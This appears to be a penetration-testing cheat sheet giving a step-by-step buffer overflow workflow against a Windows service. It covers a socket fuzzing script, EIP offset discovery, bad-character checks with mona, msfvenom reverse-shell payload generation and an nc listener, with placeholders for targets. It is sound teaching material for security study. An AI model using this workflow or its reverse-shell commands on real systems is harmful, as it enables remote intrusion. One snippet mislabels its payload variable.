## Buffer Overflow

### Finding the buffer overflow

Send large amounts of information to any available input parameters.  You're looking for the program to exit from an unhandled exception.

#### Sample Python fuzzing script
```
#!/usr/bin/python

# this is a very general python script that connects to a host/port and sends a payload.  It needs to be customized for the particular inputs to be tested in the applciation.

import sys, socket
HOST = <host or ip address>
PORT = <service port>
LENGTH = <length of buffer payload>

payload = "\x41" * LENGTH

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(payload)
s.recv(1024)
s.close()
```

#### Finding an offset value for EIP

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

# check the value stored in EIP and pass it to the pattern_offset tool

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <eip value> <length>
```

#### Verify EIP
```
# configure payload with the offset value
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
Payload = offset + EIP

# Run the script and check the EIP value.  If it indicates 'BBBB', we are able to write to EIP using the offset.

```

#### Finding where to place shellcode
```
# configure a test payload including the offset and EIP values 
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
shellcode = "\x43" * <length>
Payload = offset + EIP + shellcode

# run the script and check the stack.  if the 'C' values are present beyond the 'B' values, we have identified space for shellcode.  
# Identify whether an existing register is pointing to the shellcode space in the stack.
```

##### Generate bad characters

```
#! /usr/bin/python3
import sys
for x in range(1,256):
    sys.stdout.write("\\x" + '{:02x}'.format(x))
```
Execute the script and copy the output to paste into `ollydbg`  

or simply copy and paste the array below:

```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

##### Create a bytearray of badcharacters in ollydbg

```
# at the ollydbg command window

# create a bytearray of all available hexideciaml characters
!mona bytearray -b
```
##### Identify the memory location of the badcharacter array sent

```
# at the ollydbg command window

# using the memory address of the badcharacter array, pass it to mona and compare to our previously created bytearray
!mona compare -f bytearray.bin -a <memory address>
```
##### Verify the bad characters identified
```
# configure a test payload to exclude the known bad characters 
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
shellcode = "string of all hex characters excluding the identified bad characters"  
Payload = offset + EIP + badchars

#Execute the script  
```

##### Verify the remaining hex characters are valid

```
# at the ollydbg command window

# using the memory address of the badcharacter array, pass it to mona and compare to our previously created bytearray
!mona compare -f bytearray.bin -a <memory address>
```
##### Identify a JMP or CALL instruction to the shellcode memory address

```
# at the ollydbg command window

!mona jmp -r <memory address or register> -cpb "<bad characters>"
# return pointers are candidates for the EIP value

# to test the values, set a breakpoint at the JMP instruction address and then modify the python script with the memory address as the EIP value.  
# Remember the addresses are expressed in little endian, so they have to be entered in reverse.
# for example, a memory address of 565266B3 would be expressed as:
# EIP = "\xb3\x66\x52\x56" in the python script.
# if the breakpoint is reached after running the python script, proceed to the next step.
```

##### Generate shell code

```
# sample stageless reverse shell for windows
msfvenom -p windows/shell_reverse_tcp LHOST=<local ip> LPORT=<local listening port> EXITFUNC=thread -b "<badcharacters>" -f py

# add the output to the script.  It may also be necessary to add some NOPs prior to the shellcode in case the JMP instruction is not exact.


offset = "\x41" * <offset value> 
EIP = "<memory address for JMP to shellcode"
shellcode = "<shellcode output from msfvenom command"  
nops = "\x90" * 10 # experiment for number of nops as needed
Payload = offset + EIP + nops + shellcode
  
```
##### Start the remote listener and execute the script
```
nc -lvp <port>

# if it all works, you'll get a shell
```
